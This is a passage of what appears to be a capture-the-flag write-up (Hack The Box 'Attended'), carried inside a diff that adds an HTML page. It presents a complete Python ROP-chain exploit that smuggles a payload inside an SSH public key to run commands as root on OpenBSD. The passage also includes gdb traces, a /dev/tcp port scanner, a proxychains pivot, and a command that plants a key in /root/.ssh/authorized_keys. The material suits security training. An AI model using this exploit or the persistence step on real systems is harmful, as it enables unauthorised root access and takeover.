ANAAAAAAABqA0AAAAAAANYQYAAAAAAAfANAAAAAAACAA0AAAAAAAGcDQAAAAAAA3hBgAAAAAAB8A0AAAAAAAIADQAAAAAAAagNAAAAAAAAAAAAAAAAAAAAAAAAAAAAB</code></pre>
+</div>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">(gdb) break * 0x0040036a
+
+(gdb) run 1 2 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAEUgwiwEoAAAAAzCHASgAAAAAGEWAAAAAAAA4RYAAAAAAAFhFgAAAAAAAAAAAAAAAAAC9iaW4vc2gALWMAAAAAAABlY2hvICQoaWQpID4gL3RtcC9qZWJpZGlhaABBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQkJCQkJCQkKUA0AAAAAAAHADQAAAAAAAcANAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABwA0AAAAAAAHADQAAAAAAAbQNAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABtA0AAAAAAAHADQAAAAAAAcANAAAAAAABqA0AAAAAAANYQYAAAAAAAfANAAAAAAACAA0AAAAAAAGcDQAAAAAAA3hBgAAAAAAB8A0AAAAAAAIADQAAAAAAAagNAAAAAAAAAAAAAAAAAAAAAAAAAAAAB
+
+(gdb) c
+
+  Continuing.
+  Breakpoint 2, 0x000000000040036a in ?? ()
+
+(gdb) c
+
+  Continuing.
+  Breakpoint 2, 0x000000000040036a in ?? ()
+
+(gdb) c
+
+  Continuing.
+  Breakpoint 2, 0x000000000040036a in ?? ()
+
+(gdb) c
+
+  Continuing.
+  Breakpoint 2, 0x000000000040036a in ?? ()
+
+(gdb) c
+
+  Continuing.
+  Program received signal SIGSEGV, Segmentation fault.
+  0x000000000040036b in ?? ()
+
+(gdb) info registers $rax $rdi $rsi $rdx
+
+  rax            0x3b	    59
+  rdi            0x601106	6295814
+  rsi            0x6010e6	6295782
+  rdx            0x0	    0</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>The needed registers have been completely controlled and to give an overview to what is inside RDI and RSI:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">(gdb) x/xs $rdi
+
+  0x601106:	 "/bin/sh"
+
+(gdb) x/4xg $rsi
+
+  0x6010e6:	0x0000000000601106	0x000000000060110e
+  0x6010f6:	0x0000000000601116	0x0000000000000000
+
+(gdb) x/xs 0x0000000000601106
+
+  0x601106:	 "/bin/sh"
+
+(gdb) x/xs 0x000000000060110e
+
+  0x60110e:	 "-c"
+
+(gdb) x/xs 0x0000000000601116
+
+  0x601116:	 "echo $(id) > /tmp/jebidiah"</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>The pointers inside RSI are all going to the right places so the only thing left to do is to trigger the syscall.</p>
+</div>
+</div>
+<div class="sect2">
+<h3 id="5-8-adding-syscall">5.8 ADDING SYSCALL</h3>
+<div class="paragraph">
+<p>To finalize the exploit, the syscall instruction has been added to the code:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="python">from Crypto.PublicKey import RSA
+from pwn import *
+
+# Floating Point Conversion=========================================
+
+def convertAddressToFP(address):
+
+    addr_int = int(str(address))
+    binary = ""
+    while addr_int > 0:
+        binary += str(addr_int % 2)
+        addr_int = int(addr_int/2)
+
+    binary = binary[::-1]
+    significant_left = binary.find("1")
+    decimal_adj = len(binary[significant_left+1:])
+    exponent_precision = 127 + decimal_adj
+    exponent = ""
+    while exponent_precision > 0:
+        exponent += str(exponent_precision % 2)
+        exponent_precision = int(exponent_precision/2)
+
+    exponent = exponent[::-1]
+    mantissa = binary[significant_left+1:].ljust(23,"0")
+    binary_string = "0" + exponent + mantissa
+
+    return int(binary_string, 2)
+
+# Public Key Generation=============================================
+
+def generateRSAPublicKey(payload):
+    n = int("".join([format(ord(x),"02x") for x in payload]),16) + 1
+    print(RSA.construct((n, 65537)).exportKey(format="OpenSSH").decode("utf-8"))
+
+# Command Execution Payload=========================================
+
+payload = ""
+payload += p64(convertAddressToFP(0x006010d6 + 0x30))
+payload += p64(convertAddressToFP(0x006010d6 + 0x10))
+payload += p64(0x006010d6 + 0x30)
+payload += p64(0x006010d6 + 0x38)
+payload += p64(0x006010d6 + 0x40)
+payload += p64(0)
+payload += "/bin/sh" + "\x00"
+payload += "-c" + ("\x00" * 6)
+payload += "echo $(id) > /tmp/jebidiah" + "\x00"        # TEST COMMAND
+
+# Payload Buffer====================================================
+
+payload += "A" * (768 - 22 - len(payload))	            # buffer
+payload += "B" * 8          			                # rbp
+
+# Controlling RAX===================================================
+
+payload += p64(0x00400394)  			# mov eax, 0xffffffff; xor rcx, rcx; ret;
+for i in range(0,24):
+    payload += p64(0x00400370)  		# shr eax, 1; ret;
+payload += p64(0x00400370)  			# shr eax, 1; ret;
+payload += p64(0x0040036d)  			# not al; adc cl, 0xe8; ret;
+payload += p64(0x00400370)  			# shr eax, 1; ret;
+payload += p64(0x00400370)  			# shr eax, 1; ret;
+payload += p64(0x00400370)  			# shr eax, 1; ret;
+payload += p64(0x0040036d)  			# not al; adc cl, 0xe8; ret;
+payload += p64(0x00400370)  			# shr eax, 1; ret;
+payload += p64(0x00400370)  			# shr eax, 1; ret;
+
+# Controlling RDI, RSI, RDX=========================================
+
+payload += p64(0x0040036a)			    # pop rdx; ret;
+payload += p64(0x006010d6)			    # RDI -> Pointer to "/bin/sh"
+payload += p64(0x0040037c)			    # movups xmm0, xmmword ptr [rdx]; mov ebx, 0xf02d0ff3; ret;
+payload += p64(0x00400380)			    # cvtss2si esi, xmm0; ret;
+payload += p64(0x00400367)			    # mov rdi, rsi; pop rdx; ret;
+payload += p64(0x006010d6 + 0x08)	    # RSI -> Pointer to argv addresses
+payload += p64(0x0040037c)			    # movups xmm0, xmmword ptr [rdx]; mov ebx, 0xf02d0ff3; ret;
+payload += p64(0x00400380)			    # cvtss2si esi, xmm0; ret;
+payload += p64(0x0040036a)			    # pop rdx; ret;
+payload += p64(0)				        # RDX set to NULL
+
+# SYSCALL===========================================================
+
+payload += p64(0x004003cf)			    # syscall; ret;
+payload += p64(0)
+
+# Payload Generation================================================
+
+generateRSAPublicKey(payload)</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+</div>
+<div class="sect2">
+<h3 id="5-9-testing-on-local-openbsd">5.9 TESTING ON LOCAL OPENBSD</h3>
+<div class="paragraph">
+<p>Running the completed exploit code then passing the generated payload as an identity file when logging in via SSH:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">$ python test.py > test.key
+
+$ ssh -i test.key -l root 192.168.222.134
+
+  root@192.168.222.134's password:
+  Permission denied, please try again.
+  root@192.168.222.134's password:
+  Permission denied, please try again.
+  root@192.168.222.134's password:
+  root@192.168.222.134: Permission denied (publickey,password,keyboard-interactive).</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>Then checking if the file was created:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">$ ssh -l jebidiah 192.168.222.134
+
+obsd$ ls -l /tmp/jebidiah
+
+  -rw-r--r--  1 root  wheel  101 May  9 03:50 /tmp/jebidiah
+
+obsd$ cat /tmp/jebidiah
+
+  uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>So the exploit works on my local setup, the only thing to do is to run it on the machine.</p>
+</div>
+<hr>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="part-6-privilege-escalation-freshness-root">PART 6 : PRIVILEGE ESCALATION (freshness &#8594; root)</h2>
+<div class="sectionbody">
+<div class="sect2">
+<h3 id="6-1-attended-gateway">6.1 Attended Gateway</h3>
+<div class="paragraph">
+<p>It was stated earlier in a note that the authkeys was implemented on <strong><code>attendedgw</code></strong> but not on <strong><code>attended</code></strong>. Looking for other machines in the network via ping sweep then scanning for ports remotely:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">attended$ ifconfig vio0
+
+  vio0: flags=8b43<UP,BROADCAST,RUNNING,PROMISC,ALLMULTI,SIMPLEX,MULTICAST> mtu 1500
+  	lladdr 00:10:20:30:40:50
+  	index 1 priority 0 llprio 3
+	groups: egress
+	media: Ethernet autoselect
+	status: active
+	inet 192.168.23.2 netmask 0xffffff00 broadcast 192.168.23.255
+
+attended$ ping -c1 attendedgw
+
+  PING attendedgw.attended.htb (192.168.23.1): 56 data bytes
+  64 bytes from 192.168.23.1: icmp_seq=0 ttl=255 time=0.840 ms</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>The Attended Gateway is at <strong><code>192.168.23.1</code></strong> and now, to check for open ports, I opened a reverse proxy via SSH to the machine and ran the following script:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="bash">#!/bin/bash
+for port in {1..12000}; do
+	(echo > /dev/tcp/192.168.23.1/$port) &>/dev/null
+	[ $? -eq 0 ] && echo "TCP PORT $port open"
+done;</code></pre>
+</div>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">$ ssh -i freshness.id_rsa -l freshness -D 6969 -f -N 10.10.10.221
+
+$ sudo vim /etc/proxychains.conf
+
+$ cat /etc/proxychains.conf | tail -n2
+
+  # ATTENDED
+  socks5	127.0.0.1 6969
+
+$ proxychains ./ports.sh
+
+  TCP PORT 25 open
+  TCP PORT 53 open
+  TCP PORT 80 open
+  TCP PORT 2222 open
+  TCP PORT 8080 open</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>It seems like the SSH port is open at TCP port 2222.</p>
+</div>
+</div>
+<div class="sect2">
+<h3 id="6-2-running-the-exploit">6.2 RUNNING THE EXPLOIT</h3>
+<div class="paragraph">
+<p>The exploit has been modified to write an SSH public key to the <strong><code>authorized_keys</code></strong> file in <strong><code>/root</code></strong>:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="python">from Crypto.PublicKey import RSA
+from pwn import *
+
+# Floating Point Conversion=========================================
+
+def convertAddressToFP(address):
+
+    addr_int = int(str(address))
+    binary = ""
+    while addr_int > 0:
+        binary += str(addr_int % 2)
+        addr_int = int(addr_int/2)
+
+    binary = binary[::-1]
+    significant_left = binary.find("1")
+    decimal_adj = len(binary[significant_left+1:])
+    exponent_precision = 127 + decimal_adj
+    exponent = ""
+    while exponent_precision > 0:
+        exponent += str(exponent_precision % 2)
+        exponent_precision = int(exponent_precision/2)
+
+    exponent = exponent[::-1]
+    mantissa = binary[significant_left+1:].ljust(23,"0")
+    binary_string = "0" + exponent + mantissa
+
+    return int(binary_string, 2)
+
+# Public Key Generation=============================================
+
+def generateRSAPublicKey(payload):
+    n = int("".join([format(ord(x),"02x") for x in payload]),16) + 1
+    print(RSA.construct((n, 65537)).exportKey(format="OpenSSH").decode("utf-8"))
+
+# Command Execution Payload=========================================
+
+payload = ""
+payload += p64(convertAddressToFP(0x006010d6 + 0x30))
+payload += p64(convertAddressToFP(0x006010d6 + 0x10))
+payload += p64(0x006010d6 + 0x30)
+payload += p64(0x006010d6 + 0x38)
+payload += p64(0x006010d6 + 0x40)
+payload += p64(0)
+payload += "/bin/sh" + "\x00"
+payload += "-c" + ("\x00" * 6)
+payload += "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAjMN54BBvvnJUXFjy9FSQ0zUVC7ZJg8FG+hPkNcoIk/ZZTz84yzE3sobaFTgDhfsjgisDd2jjZg8xuBZ4Gjo2pE0aqUQfP4bQwL6N4k+TmqMjBamwy7Copjt+sF0m4EJX1ZkURCFgL1ssqXorFDfRZSA3WingLrq2GYcJS9TMLlt5ZFzcT+umOHGE5wtYCHu11yCSpZNFl2S04GTsB2R/D3X1tQqRdWpIg1JGD0/gSFSuBJNn7ngOfPKQrjlBOrvCgtB+mWgBLp0smETICi9IqIvnW6K5AWNP+ZxWm4Bjl5Vor0mmfQdCcRVElZdpEEW59XSwnhlCpzW+hk8MzQGUoqJ01JKa03rFqdHLHWIy2sfS4vFsG450A4un/hClPMoQxf12gwY2WwsBwAwRKTi1Q23lnLN/NolaCdzOdEUzVc9drcQbvWlR+dxkiW09eFEqk6TEFiVtla2oywhozphFdjye7GPVfuz/862VAMOyG/Ny/82dGOzmt+irNsfc5Tc=' >> /root/.ssh/authorized_keys" + "\x00"
+
+# Payload Buffer====================================================
+
+payload += "A" * (768 - 22 - len(payload))	            # buffer
+payload += "B" * 8          			                # rbp
+
+# Controlling RAX===================================================
+
+payload += p64(0x00400394)  			# mov eax, 0xffffffff; xor rcx, rcx; ret;
+for i in range(0,24):
+    payload += p64(0x00400370)  		# shr eax, 1; ret;
+payload += p64(0x00400370)  			# shr eax, 1; ret;
+payload += p64(0x0040036d)  			# not al; adc cl, 0xe8; ret;
+payload += p64(0x00400370)  			# shr eax, 1; ret;
+payload += p64(0x00400370)  			# shr eax, 1; ret;
+payload += p64(0x00400370)  			# shr eax, 1; ret;
+payload += p64(0x0040036d)  			# not al; adc cl, 0xe8; ret;
+payload += p64(0x00400370)  			# shr eax, 1; ret;
+payload += p64(0x00400370)  			# shr eax, 1; ret;
+
+# Controlling RDI, RSI, RDX=========================================
+
+payload += p64(0x0040036a)			    # pop rdx; ret;
+payload += p64(0x006010d6)			    # RDI -> Pointer to "/bin/sh"
+payload += p64(0x0040037c)			    # movups xmm0, xmmword ptr [rdx]; mov ebx, 0xf02d0ff3; ret;
+payload += p64(0x00400380)			    # cvtss2si esi, xmm0; ret;
+payload += p64(0x00400367)			    # mov rdi, rsi; pop rdx; ret;
+payload += p64(0x006010d6 + 0x08)	    # RSI -> Pointer to argv addresses
+payload += p64(0x0040037c)			    # movups xmm0, xmmword ptr [rdx]; mov ebx, 0xf02d0ff3; ret;
+payload += p64(0x00400380)			    # cvtss2si esi, xmm0; ret;
+payload += p64(0x0040036a)			    # pop rdx; ret;
+payload += p64(0)				        # RDX set to NULL
+
+# SYSCALL===========================================================
+
+payload += p64(0x004003cf)			    # syscall; ret;
+payload += p64(0)
+
+# Payload Generation================================================
+
+generateRSAPublicKey(payload)</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>Now passing the generated payload via SSH:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">$ python exploit.py > exploit.key
+
+$ proxychains ssh -i exploit.key -l root -p 2222 192.168.23.1
+
+  root@192.168.23.1's password:
+  Permission denied, please try again.
+  root@192.168.23.1's password:
+  Permission denied, please try again.
+  root@192.168.23.1's password:
+  root@192.168.23.1: Permission denied (publickey,password,keyboard-interactive).
+
+$ proxychains ssh -i freshness.id_rsa -l root -p 2222 192.168.23.1
+
+attendedgw# id
+
+  uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
+
+attendedgw# cat /root/root.txt
+
+  1986e8537a05420f0d59263f04dcd48a</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<hr>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="part-7-references">PART 7 : REFERENCES</h2>
+<div class="sectionbody">
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">- https://securitynews.sonicwall.com/xmlpost/vim-modelines-remote-command-execution-dec-23-2016/
+- https://medium.com/@knownsec404team/vim-neovim-arbitrary-code-execution-via-modelines-cve-2002-1377-cve-2016-1248-cve-2019-12735-c769a97dfccf
+- https://man.openbsd.org/sshd_config.5
+- https://www.rapidtables.com/convert/number/hex-to-decimal.html?x=3b
+- https://man7.org/linux/man-pages/man2/execve.2.html
+- https://www.wikihow.com/Convert-a-Number-from-Decimal-to-IEEE-754-Floating-Point-Representation
+- https://www.felixcloutier.com/x86/cvtss2si
+- https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+</div>
+</div></section>
+       </div>
+    </div>
+
+    <script>
+      function openNav() {
+        document.getElementById("sidebar").style.width = "250px";
+        document.getElementById("content").style.marginLeft = "250px";
+      }
+      function closeNav() {
+        document.getElementById("sidebar").removeAttribute("style");
+        document.getElementById("content").removeAttribute("style");
+      } 
+    </script>
+
+    
+      <script>
+        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'true', 'auto');
+        ga('send', 'pageview');
+      </script>
+    
+  </body>
+</html>
